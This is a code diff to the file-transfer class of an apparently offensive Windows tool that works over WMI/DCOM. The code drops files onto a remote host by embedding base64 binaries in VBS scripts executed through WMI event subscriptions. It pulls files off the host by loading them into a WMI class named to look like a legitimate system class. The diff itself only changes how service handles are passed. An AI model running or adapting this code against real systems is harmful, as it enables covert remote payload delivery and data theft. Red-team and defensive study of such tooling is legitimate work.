@@ -54,12 +54,10 @@ class filetransfer_Toolkit():
         # Return cimv2
         if return_iWbemServices is True:
             return iWbemServices
-        else:
-            iWbemServices.RemRelease()
     
     # For upload file, we don't need to create class, we can make binary included in vbs script(file dropper).
     # After vbs interval job created, then release your file.
-    def uploadFile(self, src_File, dest_File):
+    def uploadFile(self, src_File, dest_File, iWbemServices_Subscription=None, iWbemServices_Cimv2=None):
         
         with open(src_File,'rb') as f: binary = f.read()
         binary_EncodeData = base64.b64encode(binary).decode('ascii')
@@ -70,7 +68,7 @@ class filetransfer_Toolkit():
         print("[+] File uploading...")
         print("[+] File upload will take a long time if you try to upload large size file.")
         
-        tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True)
+        tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True, iWbemServices=iWbemServices_Subscription)
         
         # Wait 5 seconds for windows decode file.
         for i in range(5,0,-1):
@@ -78,25 +76,25 @@ class filetransfer_Toolkit():
             time.sleep(1)
         print('\r\n')
         
-        # Check dest file status.
-        self.queryfile_Status(dest_File.replace('\\','\\\\'))
+        # Check dest file status, Cimv2
+        self.queryfile_Status(dest_File.replace('\\','\\\\'), iWbemServices=iWbemServices_Cimv2)
         
         # Clean up
         print("[+] Stop vbs interval execution after created class")
-        executer.remove_Event(tag)
+        executer.remove_Event(tag, iWbemServices=iWbemServices_Subscription)
 
     # For download file, we can write file data into wmi class
-    def downloadFile(self, target_File, save_Location=None, ClassName_ForDownload=None):
+    def downloadFile(self, target_File, save_Location=None, ClassName_ForDownload=None, iWbemServices_Subscription=None, iWbemServices_Cimv2=None):
         class_Method = class_MethodEx(self.iWbemLevel1Login)
         # Default class name for download file
         if ClassName_ForDownload == None: ClassName_ForDownload = "Win32_OSRecoveryConfigurationDataStorage"
         
         # Check target file status.
-        # Reuse iWbemServices object to avoid DCOM iWbemServices
-        iWbemServices_Reuse = self.queryfile_Status(target_File.replace('\\','\\\\'), return_iWbemServices=True)
+        # Reuse cimv2 iWbemServices object to avoid DCOM iWbemServices
+        iWbemServices_Reuse = self.queryfile_Status(target_File.replace('\\','\\\\'), return_iWbemServices=True, iWbemServices=iWbemServices_Cimv2)
         # Reuse cimv2 namespace
         print("[+] Create evil class for file transfer.")
-        iWbemServices_Reuse = class_Method.check_ClassStatus(ClassName=ClassName_ForDownload, iWbemServices=iWbemServices_Reuse, return_iWbemServices=True)
+        class_Method.check_ClassStatus(ClassName=ClassName_ForDownload, iWbemServices=iWbemServices_Reuse)
         
         # Load target file into class
         print("[+] Converting file to base64 string and load it into wmi class.")
@@ -104,7 +102,7 @@ class filetransfer_Toolkit():
         with open('./lib/vbscripts/LocalFileIntoClass.vbs') as f: vbs = f.read()
         vbs = vbs.replace('REPLACE_WITH_TARGET_FILE', base64.b64encode(target_File.encode('utf-8')).decode('utf-8')).replace('RELEACE_WITH_UUID', Data_InstanceID).replace('REPLACE_WITH_CLASSNAME', ClassName_ForDownload)
         executer = executeVBS_Toolkit(self.iWbemLevel1Login)
-        tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True)
+        tag = executer.ExecuteVBS(vbs_content=vbs, returnTag=True, iWbemServices=iWbemServices_Subscription)
         
         # Wait 5 seconds for next step.
         for i in range(5,0,-1):
@@ -120,7 +118,7 @@ class filetransfer_Toolkit():
         print("[+] File downloaded and save to: %s" %save_Location)
         
         print("[+] Stop vbs interval execution after file downloaded")
-        executer.remove_Event(tag)
+        executer.remove_Event(tag, iWbemServices=iWbemServices_Subscription)
 
     def clear(self, ClassName_StoreOutput=None):
         if ClassName_StoreOutput == None: ClassName_StoreOutput = "Win32_OSRecoveryConfigurationDataStorage"
